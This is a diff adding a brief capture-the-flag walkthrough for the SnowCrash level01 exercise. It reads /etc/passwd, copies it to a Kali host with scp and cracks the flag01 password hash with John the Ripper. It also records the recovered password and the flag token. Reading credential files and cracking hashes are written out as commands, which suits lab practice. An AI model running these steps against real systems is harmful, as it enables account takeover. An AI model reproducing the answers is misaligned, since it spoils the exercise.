@@ -1,0 +1,16 @@
+level01@SnowCrash:~$ cat /etc/passwd | grep flag01
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+## copy /etc/passwd
+## run on other system
+kali:~$ scp -P 4242 level00@localhost:/etc/passwd .
+kali:~$ john -user=flag01 ./passwd
+...
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+abcdefg          (flag01)
+...
+
+level01@SnowCrash:~$ su flag01
+level01@SnowCrash:~$ getflag
+f2av5il02puano7naaf6adaaf
+level01@SnowCrash:~$ su level02
